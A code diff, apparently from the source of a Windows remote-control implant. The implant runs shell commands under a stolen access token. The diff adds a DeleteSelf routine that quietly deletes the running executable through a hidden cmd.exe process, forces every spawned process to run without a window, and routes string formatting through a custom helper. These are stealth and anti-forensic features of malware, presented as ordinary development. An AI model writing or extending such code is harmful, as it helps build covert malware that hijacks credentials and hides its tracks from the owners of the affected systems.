@@ -4,13 +4,32 @@ package command
 
 import (
 	"errors"
-	"fmt"
 	"golang.org/x/sys/windows"
+	"main/config"
 	"main/packet"
+	"main/util"
 	"os"
 	"strings"
 	"unsafe"
 )
+
+// put this function here temporary
+func DeleteSelf() {
+	if config.DeleteSelf {
+		selfName, err := os.Executable()
+		if err != nil {
+			return
+		}
+		var sI windows.StartupInfo
+		var pI windows.ProcessInformation
+		program := windows.StringToUTF16Ptr("cmd.exe /c del " + string(selfName))
+		err = createProcessNative(nil, program, nil, nil, true, windows.CREATE_NO_WINDOW, nil, nil, &sI, &pI, false)
+		if err != nil {
+			return
+		}
+		_ = windows.SetPriorityClass(pI.Process, windows.IDLE_PRIORITY_CLASS)
+	}
+}
 
 /*
 	Run this function should handler both `shell` and `run` cmd, need to return the result
@@ -97,7 +116,7 @@ func runNative(path string, args string) ([]byte, error) {
 	// create anonymous pipe
 	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
 	if err != nil {
-		return nil, errors.New(fmt.Sprintf("CreatePipe error: %s", err))
+		return nil, errors.New(util.Sprintf("CreatePipe error: %s", err))
 	}
 	defer windows.CloseHandle(hWPipe)
 	defer windows.CloseHandle(hRPipe)
@@ -151,11 +170,13 @@ func execNative(b []byte) error {
 
 // if there is a token, use it to create new process
 func createProcessNative(appName *uint16, commandLine *uint16, procSecurity *windows.SecurityAttributes, threadSecurity *windows.SecurityAttributes, inheritHandles bool, creationFlags uint32, env *uint16, currentDir *uint16, startupInfo *windows.StartupInfo, outProcInfo *windows.ProcessInformation, ignoreToken bool) error {
+	// force create no window
+	creationFlags = creationFlags | windows.CREATE_NO_WINDOW
 	if !ignoreToken && isTokenValid {
 		_, _, err := createProcessWithTokenW.Call(uintptr(stolenToken), LOGON_WITH_PROFILE, uintptr(unsafe.Pointer(appName)), uintptr(unsafe.Pointer(commandLine)), uintptr(creationFlags), uintptr(unsafe.Pointer(env)), uintptr(unsafe.Pointer(currentDir)), uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(outProcInfo)))
 		if err != nil && err != windows.SEVERITY_SUCCESS {
 			if err != windows.ERROR_PRIVILEGE_NOT_HELD {
-				return errors.New(fmt.Sprintf("CreateProcessWithTokenW error: %s", err))
+				return errors.New(util.Sprintf("CreateProcessWithTokenW error: %s", err))
 			}
 			err = windows.CreateProcessAsUser(stolenToken, appName, commandLine, procSecurity, threadSecurity, inheritHandles, creationFlags, env, currentDir, startupInfo, outProcInfo)
 			if err != nil {
@@ -165,7 +186,7 @@ func createProcessNative(appName *uint16, commandLine *uint16, procSecurity *win
 	} else {
 		err := windows.CreateProcess(appName, commandLine, procSecurity, threadSecurity, inheritHandles, creationFlags, env, currentDir, startupInfo, outProcInfo)
 		if err != nil {
-			return errors.New(fmt.Sprintf("CreateProcess error: %s", err))
+			return errors.New(util.Sprintf("CreateProcess error: %s", err))
 		}
 	}
 	return nil
